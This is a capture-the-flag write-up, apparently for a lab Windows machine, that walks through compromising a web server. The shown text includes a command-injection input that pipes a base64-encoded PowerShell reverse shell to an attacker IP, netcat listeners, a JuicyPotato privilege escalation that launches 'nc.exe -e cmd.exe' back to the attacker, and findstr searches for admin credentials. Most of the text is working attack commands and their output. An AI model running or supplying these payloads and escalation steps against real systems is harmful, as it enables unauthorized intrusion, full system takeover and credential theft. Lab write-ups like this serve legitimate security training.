After running nmap we found RDP port and Http port open. If we open the website we found a ping function, where we can get command execution by using a pipe

```bash
──(kali㉿kali)-[~]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.95] from (UNKNOWN) [10.129.154.158] 49716
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
iis apppool\defaultapppool

-----------

10.10.14.95|powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

(This is a base64 encoded payload generated in revshells.com)
```

Once we grab the shell with a netcat listener we try to find the ldapadmin credentials (first they asked us for the hotfixes, we can see them by entering the command  `Get-HotFix | ft -AutoSize`) but nothing came. Enumerating the system we found that the user has SeImpersonate privilege so we escalate privileges with JuicyPotato

```bash
PS C:\tools> .\JuicyPotato.exe -l 1337 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe -e cmd.exe 10.10.14.95 8443" -t *
Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 1337
......
[+] authresult 0
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

----------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8443
listening on [any] 8443 ...
connect to [10.10.14.95] from (UNKNOWN) [10.129.154.158] 49716
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Now, with findstr we can find the ldapadmin password (`findstr /SIM /C:"ldapadmin" *.txt *.ini *.cfg *.config *.xml`) and the confidential.txt file with dir (`dir /s confidential.txt`)

